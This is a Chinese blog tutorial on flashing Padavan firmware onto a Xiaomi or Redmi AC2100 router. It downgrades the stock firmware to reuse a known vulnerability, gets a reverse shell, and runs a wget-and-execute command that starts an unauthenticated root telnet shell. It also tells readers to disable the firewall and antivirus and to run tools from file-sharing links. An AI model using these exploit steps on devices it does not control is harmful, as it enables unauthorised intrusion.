---
title: 小米AC2100路由器刷入Padavan固件
date: 2021-02-14 12:37:37
tags: [路由器,日常折腾]
categories: 日常折腾
---
&emsp;&emsp;注：小米AC2100，红米AC2100皆可使用。  
&emsp;&emsp;注：开始前请记好宽带拨号账号密码。

# 起因
&emsp;&emsp;最近发现只要一打开迅雷下载，即使在下载速度只有几K的情况下，路由器仍然会断网，有线Wifi全挂掉。  
&emsp;&emsp;看别人说是因为CPU跑满了，路由器宕机了。  
&emsp;&emsp;遂决定刷一下固件，选择了Hihoy的Padavan固件。

# 系统环境设置
## 1. 开启Telnet
&emsp;&emsp;`控制面板-程序-启用或关闭Windows功能`，启用`Telnet客户端`。

![启用Telnet](https://pic.lufer.cc/images/2021/03/05/ysxi7j.png)

## 2. 关闭防火墙和杀毒软件
&emsp;&emsp;关闭WindowsDefender防火墙和杀毒软件（如果有）。
## 3. 禁用其他网卡
&emsp;&emsp;只留下连接路由器的网卡接口。

# 准备软件
&emsp;&emsp;因为刷机过程就断网了，所以这些软件都要提前下好。
## 1. 下载路由器刷机工具
&emsp;&emsp;链接：https://pan.baidu.com/s/1cOQdsMNr4xqi3h8fqqMfbQ 提取码：8kw8。   
&emsp;&emsp;下载完成后解压，并安装文件夹下的`WinPcap_4_1_3.exe`。
## 2. 安装Winscp
&emsp;&emsp;https://winscp.net/eng/download.php
## 3. 安装Putty
&emsp;&emsp;https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
## 4. 路由器降级
&emsp;&emsp;由于路由器新版本固件封掉了刷机漏洞，直接刷是刷不进去的，会向下面这样抛异常（图片来自网络，我自己忘了截图了）。

![高版本固件异常图](https://pic.lufer.cc/images/2021/03/05/ysxgv8.png)

&emsp;&emsp;所以要先刷固件回到低版本，下载链接放在下面。  
&emsp;&emsp;链接：https://pan.baidu.com/s/16AxC6AGIiIOBq9b96xAS-w 提取码：eb84。 

## 5. 最新的Padavan刷机包

&emsp;&emsp;https://opt.cn2qq.com/padavan/

&emsp;&emsp;可以在里面搜索2100。小米路由器下载`R2100_3.4.3.9-099.trx`，红米路由器下载`RM2100_3.4.3.9-099.trx`。

# 开始刷入
## 1. 路由器降级
&emsp;&emsp;首先到路由器设置页面，在手动升级里面选择之前下载的低版本刷机包，随后会自动刷入并重启。

![手动降级固件](https://pic.lufer.cc/images/2021/03/05/ysxbvT.png)

## 2. 修改DHCP
&emsp;&emsp;在成功降级后，进入路由器设置页面，将路由器的地址设置为`192.168.31.1`。

## 3. 插线
&emsp;&emsp;将路由器的网线都拔掉，然后将WAN口连接到LAN1口（如果后面发现有问题，可以插到LAN3试一下），中间的LAN口连接电脑。

## 4. 设置电脑IP
&emsp;&emsp;将电脑的IP手动设置为`192.168.31.177`,子网掩码`255.255.255.0`，网关`192.168.31.1`。

## 5. 设置拨号
&emsp;&emsp;打开路由器的上网设置页面，上网方式设置为`PPPOE`，账号和密码都设置为123。

## 6. 刷入Breed
&emsp;&emsp;双击打开`一键开启telnet.bat`（不用管理员运行）。
![解锁工具](https://pic.lufer.cc/images/2021/03/05/yszaR0.png)

&emsp;&emsp;按回车，会打开测试PPPOE数据包的窗口

![成功监测到数据包](https://pic.lufer.cc/images/2021/03/05/yszdzV.png)

&emsp;&emsp;如果这里抛异常，路由器要降级固件。  
&emsp;&emsp;如果没有异常，返回第一个窗口按y，注意要输入小写。

&emsp;&emsp;随后会打开反弹shell窗口，等到提示`connect to [192.168.31.177] from (UNKNOWN) [192.168.31.1] 31290` 就代表反弹成功。

![反弹成功](https://pic.lufer.cc/images/2021/03/05/yszRRx.png)

&emsp;&emsp;这时打开`开启telnet命令.txt`,复制其中的内容，也就是下面这行

>cd /tmp&&wget http://192.168.31.177:8081/busybox&&chmod a+x ./busybox&&./busybox telnetd -l /bin/sh

&emsp;&emsp;粘贴到窗口中，按ctrl+V是无效的，点右键即可粘贴，如果不行就在标题栏点右键粘贴，随后回车，出现如下图提示即代表Telnet解锁成功。

![解锁Telnet](https://pic.lufer.cc/images/2021/03/05/yySSeg.png)

&emsp;&emsp;随后打开命令提示符，粘贴如下代码运行，请逐个粘贴运行。

>telnet 192.168.31.1  
>wget http://192.168.31.177:8081/r3g.bin&&nvram set uart_en=1&&nvram set bootdelay=5&&nvram set flag_try_sys1_failed=1&&nvram commit  
>mtd -r write r3g.bin kernel1

&emsp;&emsp;如果出现如下图的提示，则代表Breed刷入成功了，此时路由器会自动重启。

![Breed刷入成功](https://pic.lufer.cc/images/2021/03/05/yySmmF.png)

## 7. 刷入Padavan

&emsp;&emsp;在路由器重启成功后，将电脑的IP地址改为自动获取，并拔掉路由器的电源，按住Reset按键并插入电源，10s后松开按钮即可。

&emsp;&emsp;注意，这里要检查电脑获取到的IP地址是否为`192.168.1.X`，如果是`169`开头的IP地址，代表自动获取失败，需要将IP地址手动设置为`192.168.1.X`网段，网关设置为`192.168.1.1`。

&emsp;&emsp;随后打开Winscp，连接192.168.1.1，协议是SCP，账号：root 或 admin 密码：admin。

&emsp;&emsp;然后上最上面的三点，切到主目录后，选择tmp文件夹，放进之前下载的最新固件`R2100_3.4.3.9-099.trx`。

&emsp;&emsp;完成后关闭Winscp，再打开Putty，输入192.168.1.1，账号：root 或 admin 密码：admin。

&emsp;&emsp;然后在出现的OP窗口里执行下边这句，注意要改成对应的文件名：

>mtd -r write /tmp/R2100_3.4.3.9-099.trx kernel

&emsp;&emsp;此时等待刷入padavan固件，完成后路由器会重启。

# 恢复现场
&emsp;&emsp;将网线插回正常状态，随后将电脑设置为自动获取IP，打开192.168.2.1 账号：root 或 admin 密码：admin 进入路由设置页面。

&emsp;&emsp;至此完成了Padavan的刷入，在`网络地图`里面设置好宽带的拨号，然后设置好wifi名称和密码即可。
